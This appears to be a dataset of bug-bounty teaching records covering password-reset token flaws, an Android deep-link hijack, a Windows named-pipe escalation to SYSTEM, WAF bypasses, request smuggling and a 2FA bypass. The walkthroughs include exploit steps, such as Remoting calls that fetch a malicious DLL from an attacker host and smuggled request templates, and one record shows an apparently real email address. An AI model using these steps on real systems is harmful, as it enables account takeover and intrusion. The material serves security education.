title: Password reset link stays valid after requesting a new one (old token not invalidated on reissue)
summary_en: The application fails to invalidate previous password reset tokens when a new one is requested, allowing multiple active links to exist simultaneously. This creates a security gap where an attacker with access to an older, unused link can still hijack the account even after the user requests a fresh reset.

lesson.cause: The root cause is a logic flaw in the token management system where tokens are treated as independent entities rather than being tied to a single active session state for the user. When the /ForgotPassword endpoint is triggered, the system generates a new token (a secret string used for identification) but fails to update the status of previously issued tokens in the database. This implementation allows multiple 'bearer credentials' (tokens that grant access to whoever holds them) to remain valid for the same account at the same time. The system only performs a cleanup once a password change is actually completed, leaving a dangerous window of time where any previously leaked or intercepted link remains functional.
lesson.walkthrough:
RECON
1. Identify the password reset page on the target website.
https://www.tripadvisor.com/ForgotPassword
Why: This is the starting point for the 'Forgot Password' flow, which is a sequence of steps designed to help a user recover access to their account.

DISCOVERY
2. Enter the target email address and submit the form to trigger the first reset email.
POST /ForgotPassword HTTP/1.1
email=victim@example.com
Why: This sends an HTTP request (a message from your browser to a server) telling the application to generate a unique token and email it to the user.
3. Access the email inbox and copy the first reset link provided.
https://www.tripadvisor.com/MemberResetPassword?prq=TOKEN_1
Why: The 'prq' is a parameter (a piece of data passed to a web page) containing the secret token that identifies this specific reset request.
4. Return to the reset page and submit the same email address a second time.
POST /ForgotPassword HTTP/1.1
email=victim@example.com
Why: This tests if the server is smart enough to cancel the first 'key' (TOKEN_1) now that it has issued a second one.
5. Access the email inbox again and copy the second, different reset link.
https://www.tripadvisor.com/MemberResetPassword?prq=TOKEN_2
Why: The system generates a new high-entropy token (a long, random string that is impossible to guess) for the new request.

EXPLOITATION
6. Open a browser and navigate to the FIRST link (TOKEN_1).
https://www.tripadvisor.com/MemberResetPassword?prq=TOKEN_1
Why: To see if the issuance of TOKEN_2 automatically deactivated TOKEN_1. If the page loads the 'choose a new password' form, the vulnerability is confirmed.
7. Observe that the password reset form for the old link is still fully functional.
[Password Reset Form UI]
Why: This proves that the application allows multiple active reset tokens for a single account simultaneously.
8. Enter a new password into the form loaded by the OLD link (TOKEN_1) and submit.
POST /MemberResetPassword HTTP/1.1
prq=TOKEN_1&password=NewPassword123!
Why: This demonstrates that the old token still has the authority to change the account's credentials.

IMPACT
9. Attempt to load the SECOND link (TOKEN_2) in the browser.
https://www.tripadvisor.com/MemberResetPassword?prq=TOKEN_2
Why: To verify if the system invalidates remaining tokens after one is finally used.
10. Observe that the second link now leads to a blank page or error.
[Blank Page]
Why: The system correctly invalidates all tokens only AFTER a password change is successful, but it fails to do so when a new link is merely requested.
lesson.takeaway: When hunting for bugs, always test the lifecycle of temporary tokens. Don't just check if they work; check if they SHOULD work after a newer one is requested. Look for this pattern in password resets, email verification links, and MFA (Multi-Factor Authentication) SMS codes. A common signal is when an app allows you to 'Resend Email' multiple times—try using the very first email after receiving the fifth. A variant of this bug occurs when tokens don't expire even after the user manually changes their password through the settings menu. Avoid the mistake of assuming that because a token is long and random (high entropy), the logic behind it is secure.

title: Hijacking Your VPN with one Deep Link
summary_en: An exported Android activity in a VPN client allowed malicious apps to supply a custom backend server via an unvalidated deep link parameter, leading to the theft of sensitive device and user data.

lesson.cause: The vulnerability is caused by the app exporting activities—components accessible to other apps—that process deep links (URLs that open apps) without validation. Specifically, the 'WebLoginCallbackActivity' and 'WebCallbackHandlerActivity' accept a 'fqdn' parameter (a server address) from any incoming Intent (a message between apps). Because the app fails to verify that the link originated from its own login process or that the hostname belongs to a trusted domain, it allows a local malicious app to redirect the VPN's registration traffic to an attacker-controlled server.
lesson.walkthrough:
RECONNAISSANCE
1. The researcher obtains the APK (the Android app file) and decompiles it (turns it back into readable code) using a tool called jadx.
2. They search the 'AndroidManifest.xml' (the app's configuration file) for 'exported' activities, which are screens that any other app on the device can start.
<activity android:name=".ui.WebLoginCallbackActivity" android:exported="true">
Why: Exported activities are the primary entry points for local attacks on Android because they allow external apps to send them data.

DISCOVERY
3. They find that 'WebLoginCallbackActivity' uses 'getIntent().getData()' to read a deep link (a special URL that opens an app screen).
4. The code extracts a parameter (a piece of data in the URL) called 'fqdn' (the server's web address).
String fqdn = data.getQueryParameter("fqdn");
Why: This parameter tells the app which server it should talk to for its initial setup and registration.
5. The researcher notices the app uses this 'fqdn' as its base URL (the main address for all its internet requests) without any validation.
Why: Without an allowlist (a list of approved addresses), the app will send sensitive data to any address provided in the URL.

EXPLOITATION
6. The researcher writes a PoC (Proof of Concept, a small test app) that only requires the 'INTERNET' permission.
<uses-permission android:name="android.permission.INTERNET" />
Why: This demonstrates that the attack does not require high-level system privileges or 'root' access.
7. The PoC app creates a fake deep link URL pointing to the attacker's server.
Uri uri = Uri.parse("vpnclient://callback?fqdn=attacker-server.com");
Why: This URL mimics the real login response but replaces the legitimate server with one controlled by the attacker.
8. The PoC app sends an Intent (a message between apps) directly to the target VPN app's exported activity.
intent.setComponent(new ComponentName("com.vendor.vpnclient", "...WebLoginCallbackActivity"));
Why: This forces the VPN app to open and process the malicious URL immediately.
9. The researcher opens the real VPN app and taps 'Login' to start the 180-second 'window' where the app accepts callbacks.
Why: The app only listens for these links for 3 minutes after a login starts, but an automated app can easily trigger the exploit within this time.
10. While the login browser is open, the researcher runs the PoC app to fire the forged callback.
Why: The PoC app sends the fake link while the VPN app is still waiting for the real one, winning the race.

IMPACT
11. The VPN app accepts the fake server address and sends a 'registration' request to the attacker's server.
GET /portal/services?action=discover&username=5550199&device_mac=00:11:22...
Why: The app thinks it is talking to its own server, so it automatically transmits the user's private information.
12. The attacker captures the user's MSISDN (phone number), MAC address (hardware ID), and GUID (unique device ID).
Why: This data provides a permanent fingerprint of the user and their device, which can be used for tracking or further attacks.
lesson.takeaway: When hunting for Android bugs, always audit 'exported' activities in the manifest, especially those handling 'android.intent.action.VIEW'. Look for parameters that define hostnames, URLs, or file paths using 'getIntent().getData()'. A common signal is when these parameters are used to configure network clients like Retrofit or OkHttp. Variants of this bug include 'Intent Redirection,' where an app is forced to launch a private activity, or 'File Provider' leaks. Avoid the mistake of assuming that only the system browser can trigger your deep links; any app on the device can send a direct Intent to an exported activity.

excerpt: This is a write-up of a vulnerability I reported to a private bug bounty program. The target is a carrier-grade mobile VPN / secure-access client. During the short window where the app is waiting for an OAuth login to complete, a malicious app sitting on the same device can hand it a different backend, and the VPN client happily starts sending its device-registration API calls there, which was caused by an unvalidated `fqdn` parameter on an exported deep-link callback and led to potentially leaking the user's phone number, MAC address, device GUID, and more _._ ## My workflow: decompile, triag

title: From Named Pipe to SYSTEM: How I Found a Local Privilege Escalation in a Major Windows Application
summary_en: An overly permissive named‑pipe ACL allowed an unprivileged user to talk to a SYSTEM service, which exposed a .NET Remoting object that could write arbitrary files as SYSTEM and later load a malicious DLL to spawn a SYSTEM shell.

lesson.cause: The service created a named pipe with FILE_ALL_ACCESS for Everyone, giving any local user full read/write rights. The pipe was used by a .NET Remoting endpoint that did not enforce any authentication or authorization checks. The exposed Remoting object (ElevatedBitsFileTransferor) accepted a DestinationFilePath parameter without validating the path, allowing arbitrary file writes as the SYSTEM account. The attacker then leveraged a known DLL‑search hijack (HID.DLL) that is loaded by osk.exe on the lock screen, completing the privilege‑escalation chain.
lesson.walkthrough:
RECON
Step 1: Scanned all named‑pipe ACLs on the machine.
accesschk.exe -accepteula -w \pipe\* 2>$null
Why: accesschk lists the permissions (ACL) of each pipe; the output showed a pipe with FILE_ALL_ACCESS for Everyone, which is unusual.

Step 2: Identified the pipe with overly permissive ACL.
\\.\Pipe\UpdateServicev5.Spc.Esd.Client.Common.Utilities.5.3.2.0
Why: The pipe name indicates it belongs to an update service; the ACL line "RW Everyone FILE_ALL_ACCESS" confirms any user can read/write.

Step 3: Determined which process owned the pipe.
handle.exe -a "UpdateService"
Why: handle.exe shows the process ID (pid 2992) and executable (UpdateService.exe) that created the pipe.

Step 4: Checked the service’s run account.
sc.exe qc UpdateServiceV5
Why: The service runs as LocalSystem (a highly privileged account), meaning anything it does runs with SYSTEM rights.

DISCOVERY
Step 5: Tested if a normal user could connect to the pipe.
$pipe = New-Object System.IO.Pipes.NamedPipeClientStream(".", "UpdateServicev5.Spc.Esd.Client.Common.Utilities.5.3.2.0", [System.IO.Pipes.PipeDirection]::InOut)
$pipe.Connect(3000)
$pipe.IsConnected
Why: PowerShell creates a client stream to the named pipe; IsConnected returned True, proving the pipe accepts connections without authentication.

Step 6: Identified the technology used by the service.
strings.exe UpdateService.exe | find "v4.0.30319"
Why: strings extracts readable text; the presence of ".NET Framework 4.8" indicates the service is a .NET assembly.

Step 7: Loaded the service binary into dnSpy to view source.
Why: dnSpy decompiles .NET assemblies, allowing us to read the C# code.

Step 8: Found the Remoting endpoint registration.
url = "ipc://UpdateServicev5.Spc.Esd.Client.Common.Utilities.5.3.2.0/ElevatedBitsFileTransferor"
Why: The URL shows a .NET Remoting object exposed over the named pipe.

EXPLOITATION
Step 9: Connected to the Remoting object from an unprivileged C# client.
ChannelServices.RegisterChannel(new IpcClientChannel(), false);
string url = "ipc://UpdateServicev5.Spc.Esd.Client.Common.Utilities.5.3.2.0/ElevatedBitsFileTransferor";
ElevatedBitsFileTransferor remote = (ElevatedBitsFileTransferor)RemotingServices.Connect(typeof(ElevatedBitsFileTransferor), url);
Console.WriteLine("Available: " + remote.Available);
Why: RegisterChannel creates a client channel; RemotingServices.Connect returns a proxy to the remote object, proving we can call its methods.

Step 10: Invoked the file‑write method to drop a file into a SYSTEM‑owned directory.
remote.StartForegroundJobInBackground("job1", new List<FileResource>{ new FileResource{ DestinationFilePath = "C:\\Windows\\System32\\test.txt", RemoteFilePath = "http://attacker/payload" } });
Why: The method forwards the DestinationFilePath to BITS, which runs as SYSTEM; no path validation lets us write anywhere.

Step 11: Verified the file exists and is owned by SYSTEM.
Why: The file appears in System32 with SYSTEM ownership, confirming an arbitrary SYSTEM file‑write primitive.

Step 12: Chose a DLL‑load hijack location (HID.DLL) used by osk.exe on the lock screen.
Why: ProcMon showed osk.exe attempts to load HID.DLL from "C:\Program Files\Common Files\microsoft shared\ink\"; the DLL does not exist by default, making it hijackable.

Step 13: Used the same remote object to write a malicious DLL to the hijack path.
remote.StartForegroundJobInBackground("job2", new List<FileResource>{ new FileResource{ DestinationFilePath = "C:\\Program Files\\Common Files\\microsoft shared\\ink\\HID.DLL", RemoteFilePath = "http://attacker/malicious.dll" } });
Why: The same unrestricted write lets us place our DLL where osk.exe will load it.

Step 14: Triggered the DLL load without reboot by opening the lock‑screen On‑Screen Keyboard.
Win+L → Ease of Access → On‑Screen Keyboard
Why: osk.exe runs as SYSTEM on the lock screen and loads HID.DLL; our malicious DLL executes, spawning a SYSTEM cmd.exe.

IMPACT
Step 15: Obtained an unrestricted SYSTEM command prompt on the lock screen.
Why: The DLL executed with the privileges of the loading process (SYSTEM), giving full control over the machine.
lesson.takeaway: When hunting Windows privilege‑escalation bugs, always enumerate named‑pipe ACLs; a pipe with FILE_ALL_ACCESS for Everyone is a red flag. Look for services running as LocalSystem that expose .NET Remoting or other IPC mechanisms without authentication. Check any method that accepts a file path for missing validation – it often leads to arbitrary SYSTEM writes. Common variants include WCF services over pipes, COM/DCOM objects, or RPC endpoints that trust the caller. Beginners often forget to verify the service’s run account, causing them to miss the privilege gap.

title: A 403 Bypass Worth $900: How a Semicolon Exposed API Documentation
summary_en: A researcher bypassed Cloudflare's 403 Forbidden restrictions on an API documentation page by injecting semicolons into the URL path, exploiting a parsing discrepancy between the security filter and the backend server.

lesson.cause: The vulnerability is caused by a path normalization discrepancy between the Web Application Firewall (WAF) and the backend application server. A WAF (a security tool that filters web traffic) often uses strict pattern matching to block specific URLs like '/service/v4/reference/'. However, some backend frameworks, such as Java Spring, support 'matrix variables,' which allow parameters to be embedded directly in the URL path using semicolons. When the researcher added a semicolon, the WAF saw a path that did not match its 'blocked' list (e.g., '/v4;/'). Meanwhile, the backend server stripped the semicolon and its following characters during its own normalization process (the way a server cleans up a URL), routing the request to the intended restricted resource.
lesson.walkthrough:
RECON
1. The researcher began by investigating an API subdomain (a prefix added to a main domain name like 'api.example.com') belonging to the target.
2. They visited the root URL but received a '403 Forbidden' response (a status code meaning the server refuses to authorize the request) from Cloudflare.
3. To find hidden paths, they used Yahoo Search to find indexed URLs (web addresses that a search engine has saved in its database).
4. They discovered a functional API URL: 
https://example.com/service/v4/catalog/en/items/482901/feedback?limit=10&page=1&sort=recent&direction=desc
5. This revealed that the application used a '/service/' prefix for its API routes (specific web addresses where an API can be reached).

DISCOVERY
6. The researcher navigated to the base service path: 
https://example.com/service
7. On this page, they found a link to 'Interactive REST API documentation.'
8. Clicking the link led to a Swagger UI page (a visual map that shows all the secret paths and instructions of an API), but it was blocked: 
https://example.com/service/v4/reference/start.html

EXPLOITATION PHASE 1
9. The researcher attempted to bypass the block by adding a semicolon (;) after the version segment of the URL.
10. Payload used: 
https://example.com/service/v4;/reference/start.html
11. Why: The semicolon tells the backend to treat the segment as a 'matrix variable' (extra data in the path), but the WAF sees it as a different, unblocked path. (A segment is the part of a URL between two slashes).
12. The server responded with a '200 OK' (success), and the documentation loaded.

EXPLOITATION PHASE 2
13. Two years later, the researcher found the original semicolon trick was fixed and now returned a 403.
14. They tried a new variation by placing the semicolon later in the path and adding a dummy key-value pair.
15. Payload used: 
https://example.com/service/v4/reference/;foo=bar/start.html
16. Why: ';foo=bar' is a standard matrix variable format. The security filter was likely only looking for semicolons in specific spots, not everywhere.
17. This second variation successfully bypassed the new security rule.

IMPACT
18. The researcher demonstrated that they could still access the Swagger UI, exposing the entire structure of the API.
19. They also found other working variations: 
https://example.com/service/v4/reference;/start.html
20. And: 
https://example.com/service/v4/reference/;/start.html
21. The researcher reported both findings, proving that a simple character can bypass expensive security layers.
lesson.example: Imagine a website 'target.example' that blocks access to its admin panel at 'https://target.example/api/v1/admin'. The security filter (WAF) is programmed to block any request containing the exact string '/admin/'. An attacker sends a request to 'https://target.example/api/v1/admin;user=guest/settings'. The WAF looks at the path, sees '/admin;user=guest/', decides it does not match the forbidden '/admin/' string, and lets it through. The backend server, built with a framework like Spring, sees the semicolon and ignores everything from the semicolon to the next slash. It processes the path as '/api/v1/admin/settings', granting the attacker access to the admin settings page because the security check was bypassed.
lesson.takeaway: This bug highlights the importance of 'Path Normalization' testing. When you encounter a 403 Forbidden error, never assume the path is truly unreachable; instead, try injecting characters that different servers interpret differently, such as semicolons (;), dots (.), or null bytes (%00). Use alternative search engines like Yahoo or DuckDuckGo to find 'leaked' paths that Google might have missed. A common mistake for beginners is giving up after one bypass is fixed; as shown here, moving the payload to a different segment of the URL can often bypass the new, specific filter. Look for this pattern in Java (Spring), Python (Flask), and Ruby on Rails applications.

title: An Old Password Reset Link Was Enough to Take Back the Account
summary_en: A password reset token remained valid even after a manual password change, allowing an attacker with access to an old reset link to hijack the account.

lesson.cause: The application's token management logic only checked if a password reset token was expired or already used, rather than checking if the account's security state had changed. When a user manually updated their password, the system failed to revoke or invalidate outstanding reset tokens associated with that user. This created a logic flaw where a recovery credential issued for an 'old' version of the account remained functional for the 'new' version.
lesson.walkthrough:
RECON
1. The researcher identified the password reset endpoint, which is a specific web address used to trigger recovery emails.
2. They navigated to the UXCam login page and located the 'Forgot Password' button.

DISCOVERY
3. The researcher entered their email address to trigger a password reset request.
4. An HTTP request (a message sent by your browser to a server) was sent to the backend to generate a token.
5. A 'token' is a unique, secret string of characters used to prove you have permission to change a password.
6. The researcher received the email and copied the reset link but did not click it yet.
7. The link looked like this: https://app.uxcam.com/reset-password?token=SECRET_TOKEN_123

SECURITY ACTION
8. The researcher logged into the account normally using their current password.
9. They navigated to the account settings to perform a manual password change.
10. They updated the password to a new value (e.g., 'NewPassword123').
11. This action is supposed to create a 'security boundary,' meaning all old session or recovery links should be killed.

EXPLOITATION
12. The researcher opened a new 'incognito session,' which is a private browser window that does not share saved logins or cookies.
13. They pasted the OLD reset link (from Step 7) into the browser.
14. The application loaded the 'Set New Password' page instead of showing an 'Expired' error.
15. The researcher entered a third password (e.g., 'AttackerPassword456') into the form.
16. The application accepted the request and confirmed the password was changed.

IMPACT
17. The researcher tried to log in with the password they set in Step 10.
18. The login failed because the old token had overwritten the legitimate password change.
19. The researcher logged in with 'AttackerPassword456' and successfully gained access.
20. This confirmed a full Account Takeover (ATO), where an attacker can lock a user out using a stale link.
lesson.example:
Imagine a website 'target.example' that sends reset links. A user requests a link but then remembers their password and changes it manually for safety. 

1. User requests: https://target.example/reset?t=abc
2. User changes password manually to 'Safe123'.
3. Attacker finds the link 'abc' in the user's browser history.
4. Attacker visits: https://target.example/reset?t=abc
5. The server code only checks: 'Is token abc in the database? Yes. Is it older than 24 hours? No.'
6. The server allows the attacker to set a new password, ignoring that the user already updated their security settings.
lesson.takeaway: Always test the 'lifecycle' of security tokens by performing sensitive actions (changing email, changing password, enabling MFA) and seeing if old tokens survive. Look for 'stale' credentials that should have been revoked by a state change. A common variant is when a 'Remember Me' cookie or an active session remains valid after a password change. Beginners often forget to test the 'Forgot Password' link against a 'Manual Password Change'—they usually only test if the link works once.

excerpt: You request one, use it once, and after your password changes, any previously issued recovery link should effectively become useless. At least, that is what users expect. While testing UXCam’s authentication flow, I found a password reset token that survived something it should not have survived: **A manual password change.** That meant an old reset link issued before the password was changed could still be used afterward to set a completely new password. title: It Returned 404… But the Data Was Still There
summary_en: An application attempted to hide sensitive admin data by displaying a 404 Not Found error page, but the underlying HTTP response still contained the full list of employee data.

lesson.cause: The vulnerability stems from a 'client-side security' flaw where the server-side logic fetches sensitive data before or during an authorization check. Instead of preventing the data from being sent, the application sends the data to the browser and then relies on the user interface to hide it if the user is unauthorized. Specifically, the endpoint api/get-users was configured to return a 404 status code to unauthorized users, but it failed to clear the response body, leaving the sensitive JSON data accessible to anyone inspecting the network traffic.
lesson.walkthrough:
RECONNAISSANCE
1. The researcher used waybackurls (a tool that fetches old URLs from internet archives) and katana (a tool that crawls websites to find hidden links) to gather a list of endpoints.
waybackurls target.example | katana
Why: To find hidden or forgotten pages that might not be linked on the main site (endpoints are specific web addresses like /login or /api/data).

2. The researcher filtered the results to look for sensitive keywords like 'admin'.
grep "admin" endpoints.txt
Why: Admin pages often contain more sensitive functionality or data than standard user pages.

DISCOVERY
3. The researcher attempted to visit one of the discovered admin URLs in a web browser.
https://target.example/admin-dashboard
Why: To see if the page is publicly accessible or protected by a login (authentication is the process of verifying who a user is).

4. The browser displayed a 'You can’t access this page — 404' message.
Why: A 404 error usually means 'Not Found,' suggesting the page doesn't exist or is hidden.

5. While the page was loading, the researcher noticed a table of data appeared and disappeared in less than a second.
Why: This 'flicker' suggests the browser received data and tried to show it before the website's code decided to hide it.

EXPLOITATION
6. The researcher opened Burp Suite (a tool used to intercept and inspect web traffic between a browser and a server).
Why: To see the raw HTTP request (the message the browser sends to the server) and the HTTP response (the message the server sends back).

7. The researcher reloaded the admin page while Burp Suite was running.
Why: To capture the exact data being sent by the server to the browser.

8. In the Burp Suite 'HTTP history' tab, the researcher located a request to a specific data-fetching endpoint.
GET /api/get-users HTTP/1.1
Why: Modern websites often load a 'shell' page first and then make separate requests to an API (Application Programming Interface, a way for programs to talk to each other) to get the actual data.

9. The researcher inspected the response from the server for that request.
HTTP/1.1 404 Not Found
Content-Type: application/json
[{"id":1,"name":"John Doe","email":"john@example.com"},...]
Why: Even though the status code was 404 (Not Found), the response body (the actual content of the message) contained the full list of employee data.

IMPACT
10. The researcher confirmed that any user could view sensitive employee PII (Personally Identifiable Information) without logging in.
Why: The server failed to implement proper access control (rules that determine who can see what data) at the data level.
lesson.example: Imagine a website at 'target.example/admin/logs'. When a regular user visits, the website's JavaScript code checks if 'user.role' is 'admin'. If not, it shows a '404 Not Found' image. However, the code still runs a background command: 'fetch("/api/admin/raw-logs")'. The server receives this request and, because it doesn't check permissions on the server-side, it sends back a JSON file containing all system logs. An attacker simply opens their browser's 'Network' tab (F12), clicks on the 'raw-logs' request, and reads the sensitive data in the 'Response' section, completely bypassing the 404 image shown on the screen.
lesson.takeaway: Always look for 'flickering' UI elements that appear briefly before an error message; this is a major red flag that data is being sent before authorization is verified. Use a proxy tool like Burp Suite to inspect every response, as developers often use 'Security through Obscurity' (trying to hide things rather than securing them) by sending a 404 or 403 status code while still including the data in the body. A common variant of this is 'Information Disclosure via Client-Side Routing,' where the frontend hides a component but the backend API remains wide open. Avoid the mistake of trusting the browser to hide data; if the data reaches the user's computer, it is already compromised.

title: The AES Key That Bypassed Every Fix: From Mass PII Exposure to 2FA Bypass
summary_en: A hardcoded AES encryption key in frontend JavaScript allowed a researcher to decrypt sensitive API responses and bypass Two-Factor Authentication (2FA) by tampering with the encrypted verification state.

lesson.cause: The developers attempted to secure sensitive data by encrypting API responses, but they stored the secret AES key in the frontend JavaScript (code that runs in the user's browser), making it accessible to anyone. Additionally, the server relied on the client to send back an encrypted status string ('N' for No, 'Y' for Yes) to confirm 2FA completion, rather than tracking the 2FA state securely on the server side. This implementation flaw allowed an attacker to use the exposed key to forge a 'successful' 2FA response.
lesson.walkthrough:
RECON
Step 1: The researcher examined the frontend JavaScript (code that runs in the browser) and discovered a hardcoded AES key.
<AES-KEY>
Why: Hardcoded secrets in client-side code are accessible to any user who views the page source or uses browser developer tools.

DISCOVERY
Step 2: The researcher identified that the application was sending encrypted responses from various API endpoints (interfaces that allow programs to talk to each other).
GET /api/proxy-service/companies?tenantCode=PIL&companyRegistrationNumber=1
Why: The application used encryption to hide sensitive data like PII (Personally Identifiable Information) after previous vulnerabilities were reported.

Step 3: The researcher wrote a Node.js script to attempt decryption using the discovered key and the AES-GCM algorithm (a specific method of encryption that ensures data integrity).
const decipher = crypto.createDecipheriv("aes-256-gcm", key, iv);
Why: By mimicking the application's internal logic, the researcher could unscramble the data into readable text.

EXPLOITATION: DATA EXPOSURE
Step 4: The researcher successfully decrypted the API response, revealing sensitive company and contact data.
console.log(decrypted);
Why: Since the key was known, the encryption provided no actual security against a motivated user.

EXPLOITATION: 2FA BYPASS
Step 5: The researcher observed the 2FA (Two-Factor Authentication, an extra security layer) flow and captured an encrypted verification response.
<encrypted_2fa_response>
Why: The researcher suspected the same key might be used for other security-critical functions.

Step 6: The researcher decrypted the 2FA response and found a simple status string.
mahmoudmagdy45456@gmail.com:null:1776557237487:N
Why: The 'N' at the end of the string represented 'No,' indicating the 2FA was not yet completed.

Step 7: The researcher modified the decrypted string, changing the 'N' to a 'Y' (representing 'Yes').
mahmoudmagdy45456@gmail.com:null:1776557237487:Y
Why: The goal was to trick the server into thinking the 2FA process was successful.

Step 8: The researcher wrote a script to re-encrypt the modified string using the same AES key and a new IV (Initialization Vector, a random number used to start encryption).
const cipher = crypto.createCipheriv("aes-256-gcm", key, iv);
Why: To be accepted by the server, the modified data had to be encrypted exactly like a legitimate response.

Step 9: The researcher sent the forged, encrypted 'Y' response back to the application.
[Modified Encrypted Payload]
Why: The server accepted the payload as valid because it was encrypted with the correct key.

IMPACT
Step 10: The application granted access to the account, bypassing the 2FA requirement entirely.
Why: The server trusted the client-provided encrypted value to determine the 2FA state instead of verifying it internally.
lesson.example: Assume a fictional site target.example uses a hardcoded key 'SECRET_KEY_123' in its 'app.js' file. When a user logs in, the server sends an encrypted cookie: 'ENCRYPTED_STATUS'. Using the key, an attacker decrypts the cookie to find 'user_id=500;is_admin=false'. The attacker changes 'false' to 'true', re-encrypts the string with 'SECRET_KEY_123', and replaces their cookie. The server, seeing the validly encrypted cookie, grants the attacker administrative privileges. This works because the server trusts the client to hold and return sensitive state information that the client can actually manipulate.
lesson.takeaway: When you find a hardcoded secret or key in JavaScript, your work is only beginning; you must find where that key is used in network traffic. Look for high-entropy (random-looking) strings in API responses or cookies and try to decrypt them using the found key. A common variant of this bug is 'Client-Side Session Management,' where the server trusts the client to store its own permissions. Avoid the mistake of reporting a 'Hardcoded Secret' as a low-severity bug without demonstrating how it can be used to access data or bypass authentication.

title: HTTP Request Smuggling (TE.CL) to Session Hijacking via GraphQL
summary_en: An HTTP Request Smuggling vulnerability allowed an attacker to poison a back-end connection and capture a victim's full request. By redirecting this data into a GraphQL mutation, the attacker stored the victim's session cookies in their own support chat history.

lesson.cause: The vulnerability was caused by a TE.CL desynchronization (a state where two servers disagree on where a request ends) between a front-end proxy and a back-end server. The front-end prioritized the Transfer-Encoding header (a header telling the server data is sent in pieces), while the back-end prioritized the Content-Length header (a header telling the server the exact size of the data). This mismatch allowed the researcher to leave a 'partial' request hanging on the back-end connection. Furthermore, the /graphql endpoint (a specific web address for data queries) accepted form-encoded data, which is less strict than JSON, allowing the next user's request to be appended to a text parameter without crashing the application.
lesson.walkthrough:
RECON
Step 1: The researcher identified the target's infrastructure, noting a front-end proxy (a middleman server) and a back-end application server.
Step 2: They tested for Request Smuggling (a technique to interfere with how a website processes sequences of HTTP requests).
DISCOVERY
Step 3: The researcher confirmed a TE.CL mismatch where the front-end used Transfer-Encoding and the back-end used Content-Length.
Step 4: They attempted to smuggle a request to a standard JSON API endpoint.
Step 5: They observed that the JSON parser (a tool that reads data in a specific structured format) failed because the victim's request broke the JSON structure.
Step 6: They searched for alternative endpoints and found /graphql, which accepted application/x-www-form-urlencoded data (a format where data is sent as key-value pairs like name=value).
EXPLOITATION
Step 7: The researcher crafted a 'trigger' request to desynchronize the connection.
POST /api/stich_transitionState?localeCode=en-US HTTP/1.1
Host: target.example.com
Transfer-Encoding: chunked
Content-Length: [Calculated Length]

0
Why: The front-end sees the '0' and thinks the request is finished, but the back-end is told by Content-Length to keep waiting for more data.
Step 8: They appended a second, 'smuggled' request immediately after the trigger.
POST /graphql HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Why: This smuggled request (a hidden request tucked inside another) is what the back-end will process next.
Step 9: They used a GraphQL mutation (a type of request used to change or save data) that updates a support message.
operationName=updateMobileContact_deprecated&variables[request][message][text]=HIJACKED_REQUEST_BEGINS:
Why: This parameter (a piece of data sent to the server) will act as a container for the victim's data.
Step 10: They set a very large Content-Length for the smuggled GraphQL request.
Content-Length: [SMUGGLED_BODY_LENGTH + VICTIM_REQUEST_LENGTH]
Why: This makes the back-end 'hungry,' meaning it stays open and waits to swallow the next request that arrives on the connection.
Step 11: The researcher sent the combined payload (the actual malicious data being sent) to the server.
Step 12: A victim user sent a legitimate request to the server on the same connection.
GET /path/inbox HTTP/1.1
Host: target.example.com
Cookie: session_cookie=VICTIM_SESSION_VALUE
Why: Because the back-end was still 'hungry' from Step 10, it treated the victim's request as the continuation of the attacker's message text.
IMPACT
Step 13: The application processed the mutation, saving the attacker's message.
Step 14: The saved message now contained the victim's full request, including their Cookie (a small ID tag used to identify a logged-in user).
Step 15: The researcher logged into their own account and opened the support conversation.
Step 16: They viewed the message and successfully extracted the victim's session cookie.
Step 17: Using the stolen cookie, the researcher performed session hijacking (taking over another user's active session) to access the victim's account.
lesson.example: Imagine a fictional site target.example.com that has a 'Update Profile Bio' feature. The server is vulnerable to TE.CL smuggling. An attacker sends a request to update their bio, but sets the Content-Length to be 500 bytes larger than the actual bio text. The request ends with 'bio=My bio is: '. When a victim user visits the site and their browser sends a request like 'GET /dashboard HTTP/1.1' followed by their private 'Cookie: session=12345', the server thinks this text is part of the attacker's bio. The attacker then simply views their own profile, and their bio now displays the victim's full request and session cookie.
lesson.takeaway: When hunting for request smuggling, always look for endpoints that store user-supplied text, such as chat systems, profile bios, or support tickets. These are perfect 'sinks' for capturing smuggled data. If a JSON endpoint fails because the smuggled data is not valid JSON, look for form-encoded or GraphQL alternatives which are often more flexible. Use tools like Burp Suite's HTTP Request Smuggler to automate the detection of TE.CL and CL.TE mismatches. A common mistake is assuming a '400 Bad Request' means the site is not vulnerable; it often just means your payload needs adjustment to be syntactically valid for the application layer.
lesson.fix: To fix this, the organization should ensure that the front-end proxy and the back-end server use the same HTTP parsing library or configuration to avoid desynchronization. The most effective solution is to use HTTP/2 for the entire connection chain, as it uses a binary framing mechanism that eliminates the ambiguity of request boundaries. Additionally, the back-end should be configured to reject any request that contains both a Content-Length and a Transfer-Encoding header. Example fix in a configuration: 'http_protocol_options { strict_header_validation: true; }' or ensuring the proxy normalizes requests before forwarding them.

title: How Changing a POST Request to GET Exposed Users’ PII and Earned Me a $5,000 Bounty
summary_en: Changing a POST request to a GET request on the privacy‑request endpoint returned other users’ personal data, exposing a broken access‑control flaw.

lesson.cause: The endpoint that processes privacy‑request records accepted both POST and GET methods but only enforced authorization on the POST path. When the researcher switched the HTTP method from POST to GET, the server skipped the user‑identity check. The request body, which normally contained the authenticated user’s ID, was removed, so the backend had no way to know who was asking. Because the code relied on the presence of a POST payload to enforce access, any GET request without a body was treated as a generic query and returned all matching records. This design flaw allowed unauthenticated enumeration of other users’ privacy requests.
lesson.example:
**Vulnerable snippet (fictional target.example)**
```python
# Flask‑like pseudo code
@app.route('/api/privacy', methods=['POST','GET'])
def privacy():
    if request.method == 'POST':
        user_id = request.json.get('user_id')   # only POST reads body
        # correct: verify user_id belongs to authenticated session
    else:  # GET
        # BUG: no authentication check here
        records = db.query('SELECT * FROM privacy_requests')
        return json.dumps(records)
```
**Attack request**
```
GET https://target.example/api/privacy HTTP/1.1
Host: target.example
```
**Why it works**: The GET request reaches the same endpoint but the code never checks who is calling, so the database returns every privacy‑request record. Because no body is sent, the server cannot infer a user identity, yet it still returns data, leaking PII.
lesson.takeaway: When testing APIs, never assume that an endpoint is safe just because the application uses a specific HTTP method. Look for endpoints that accept multiple methods and try each one, especially GET, which is often cached and may bypass auth checks. Review API documentation for filtering or pagination parameters – they can be abused to pull large data sets. Tools like Burp Suite or OWASP ZAP make it easy to replay a request with a different method. Variants of this bug appear in services that treat GET as a read‑only shortcut without re‑checking authentication, such as analytics dashboards or export endpoints. Beginners often forget to test method changes, missing this simple yet powerful flaw.
